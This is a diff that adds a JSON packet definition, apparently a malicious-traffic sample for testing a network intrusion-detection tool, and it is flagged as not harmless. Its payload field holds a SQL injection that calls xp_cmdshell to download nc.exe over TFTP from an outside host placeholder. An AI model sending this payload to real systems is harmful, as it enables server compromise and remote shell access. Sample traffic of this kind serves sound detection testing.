@@ -1,0 +1,11 @@
+{
+    "PacketType": "tcp",
+	"Ipsrc":      "[IP_OUT]",
+	"Ipdst":      "[IP_IN]",
+	"SrcPort":    "[RANDOM]",
+	"DstPort":    "1433",
+	"IcmpHeader": "",
+	"Payload":    "GET /error.asp?message='\\' or EXEC master.sys.xp_cmdshell \\'tftp -i [IP_OUT] GET nc.exe c:\\nc.exe\\'' HTTP/1.1\\nServer: [SERVERNAME]",
+	"Tcpflags":   "[ACK]",
+	"Harmless":   false
+}
